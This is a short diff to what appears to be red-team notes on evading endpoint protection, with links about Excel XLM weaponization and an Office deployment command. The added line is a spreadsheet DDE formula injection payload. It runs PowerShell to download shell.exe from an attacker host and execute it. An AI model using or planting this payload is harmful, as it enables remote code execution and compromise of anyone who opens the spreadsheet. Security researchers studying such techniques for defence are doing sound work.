@@ -2,3 +2,4 @@ https://0xsp.com/offensive/red-ops-techniques/bypass-endpoint-with-xlm-weaponiza
 https://cognosec.com/bypassing-symantec-endpoint-protection-for-fun-profit-defense-evasion/
 https://www.microsoft.com/en-us/download/details.aspx?id=49117
 (.\setup.exe /configure .\configuration-Office2021Enterprise.xml)
+=cmd|’ /C powershell Invoke-WebRequest “http://www.attacker.com/shell.exe” -OutFile “$env:Temp\shell.exe”; Start-Process “$env:Temp\shell.exe”‘!A1
